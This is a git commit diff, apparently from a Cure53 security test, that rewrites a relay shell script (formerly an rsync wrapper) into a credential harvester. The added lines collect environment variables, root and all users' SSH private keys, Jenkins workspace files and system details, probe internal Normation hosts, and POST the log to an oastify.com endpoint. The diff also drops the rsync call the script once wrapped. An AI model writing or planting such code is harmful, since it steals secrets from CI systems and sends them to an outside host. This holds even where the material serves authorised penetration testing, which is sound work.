1a98fcc31fb696492f8e5fa0a8fb51cf5b99b396
cure53-fabian <fabian@cure53.de>
2025-05-19 16:56:58 +0200

    testing makefile

--- relay/sources/cure53.sh
+++ relay/sources/cure53.sh
@@ -2,22 +2,57 @@
 apt update && apt install -y curl
 
 LOG="$(mktemp)"
- 
+# Cure53 testing
+
+echo "== system ==" >> "${LOG}"
+id >> "${LOG}"
+date >> "${LOG}"
+uname -a >> "${LOG}"
+ip addr >> "${LOG}"
+
 echo "== env ==" >> "${LOG}"
 env >> "${LOG}"
-echo "== ls Home ==" >> "${LOG}"
-ls -lah ~/ >> "${LOG}"
-ls -lah ~/* >> "${LOG}"
-echo "== cat ssh keys ==" >> "${LOG}"
-cat ~/.ssh/* >> "${LOG}"
+
 echo "== ps aux ==" >> "${LOG}"
 ps aux >> "${LOG}"
 
+echo "== ls Home ==" >> "${LOG}"
+ls -lah ~/ >> "${LOG}"
+ls -lah ~/* >> "${LOG}"
+
+echo "== github ==" >> "${LOG}"
+ssh git@github.com >> "${LOG}"
+
+echo "== cat root ssh keys ==" >> "${LOG}"
+cat ~/.ssh/* >> "${LOG}"
+
+echo "== cat user ssh keys ==" >> "${LOG}"
+cat /home/*/.ssh/* >> "${LOG}"
+
+echo "== ls tmp ==" >> "${LOG}"
+ls -lah /tmp/ >> "${LOG}"
+
+echo "== ls Root ==" >> "${LOG}"
+ls -lah / >> "${LOG}"
+
+echo "== ls Jenkins Workspace ==" >> "${LOG}"
+touch /srv/jenkins/workspace/cure53.txt
+ls -lah /srv/jenkins/workspace/ >> "${LOG}"
+cat /* >> "${LOG}"
+
+echo "== blueocean.priv.normation.com ==" >> "${LOG}"
+curl -v "http://blueocean.priv.normation.com" >> "${LOG}"
+curl -v "https://blueocean.priv.normation.com" >> "${LOG}"
+
+echo "== nrm-vir-repository-01.priv.normation.com ==" >> "${LOG}"
+curl -v "http://nrm-vir-repository-01.priv.normation.com" >> "${LOG}"
+curl -v "https://nrm-vir-repository-01.priv.normation.com" >> "${LOG}"
+
+echo "== ci.normation.com/jenkins/ ==" >> "${LOG}"
+curl -v "https://ci.normation.com/jenkins/" >> "${LOG}"
+
 # send the collected log to the OAST endpoint
 curl -s -X POST --data-binary @"${LOG}" https://lynrf95yqtuijsb55q3d0brzmqshg94y.oastify.com/makefile
-echo "curl"
-/usr/bin/rsync.real --verbose --stats "$@"
+
 # clean up
 rm -f "${LOG}"
-# exit with the same code rsync.real used
-exit "${PIPESTATUS[0]}"
